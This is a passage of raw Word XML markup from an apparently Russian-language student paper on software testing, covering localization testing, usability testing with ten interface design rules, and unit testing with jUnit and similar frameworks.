    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:num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создание возможности поддержки элементов приложения, которые невозможно локализовать стандартным образом (к примеру, вертикально расположенные иероглифы или написание арабских предложений справа налево);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:num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создание продукта с возможностью поддержки новых </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>локалей</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> при желании пользователя, что позволяет избежать трудностей при интеграции продукта для стран с другой культурой.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>usability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>testing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>)</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>-тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Usability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> – удобство) – это проверка программного продукта на соответствие с требованиями в плане удобности использования приложения. Таким образом, с помощью </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve">-тестирования мы можем определить эргономичность (приспособленность </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>к использовании</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>) программы. Тестирование удобства пользования - это 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 Выявлять проблемы, связанные со специфическим механизмом интерфейса определять, существуют ли проблемы с удобностью интерфейса для навигации, использования основного функционала.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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Проверка </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> приложения заключается в:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:num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lastRenderedPageBreak/>
        <w:t>Оценка соответствия дизайна приложения к его функциональности, заданной заказчиком.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:num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Анализ используемых графических элементов, цветового оформления с точки зрения восприятия.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:num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Оценке удобства навигации и ссылочной структуре.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:num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Анализ текстового наполнения сайта.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:num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Оценка удобства использования функциями приложения (сервисами, если это сайт).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:num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Анализ шрифтового оформления текста.</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noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-RU"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BC4D276" wp14:editId="18CAC286">
            <wp:extent cx="3848100" cy="3733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8100" cy="3733800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Рисунов</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> (2.1</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve">) Визуализация </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>юзабилити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> тестирования</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10 правил проектирования пользовательского интерфейса, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Norman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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1) Информативность системы – пользователь всегда должен знать текущий статус приложения.</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2) Приближенность приложения к реальному миру – диалог с пользователем должен вестись на понятному ему языку, остерегаясь использования непонятной терминологии.</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lastRenderedPageBreak/>
        <w:t>3) Система должна иметь выходы – приложение всегда должно иметь «запасные выходы» из любой функциональности, которые пользователь по ошибке запустил.</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4) Однозначность. Все термины, функции и понятия должны описываться в едином толковании – у пользователя не должно возникнуть путаницы.</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5) Предусмотрительность. Система должна всячески «оберегать» пользователя от возможных ошибок.</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6) Наглядность. Пользователь не должен ломать голову в попытках понять, что ему нужно делать или пытаясь вспомнить, как он достиг того или иного состояния системы. Возможные манипуляции с программой должны быть постоянно наглядными.</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7) Гибкость и эффективность. Предоставляйте опытным пользователям возможность избегать рутинных действий, и в то же самое время, необходимо скрывать расширение функционала от неопытных.</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8) Лаконичность и точность. Диалоги должны содержать только ту информацию, которую необходимо донести до пользователя, ничего лишнего.</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9) Лояльность к ошибкам. Информация об ошибках должна быть понятной и содержать подсказки к дальнейшим действиям.</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10) Постоянная справка. Как бы информативно не была спроектирована система – она всегда должна содержать раздел справки и документации.</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p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00322095"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2.3 Библиотека </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>J</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pP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lang w:val="en-US"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>testing</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> (юнит тестирование или модульное тестирование) — заключается в изолированной проверке каждого отдельного элемента путем запуска тестов в искусственной среде. Для этого необходимо использовать драйверы и заглушки. Поэлементное тестирование — первейшая возможность реализовать исходный код. Оценивая каждый элемент изолированно и подтверждая корректность его работы, точно установить проблему </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">значительно проще чем, если бы элемент был частью системы. </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Элемент) — наименьший компонент, который можно скомпилировать.</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Фреймворк </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>jUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> является весьма удачным решением задач, связанных с тестированием </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>java</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> приложений. Растущая популярность привела к созданию подобных </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>фреймворков</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> для других языков. Вот некоторые из них:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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1) Для С++ была реализована </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CPPUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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2) </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> может использоваться совместно с </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>JSUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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3) Для </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
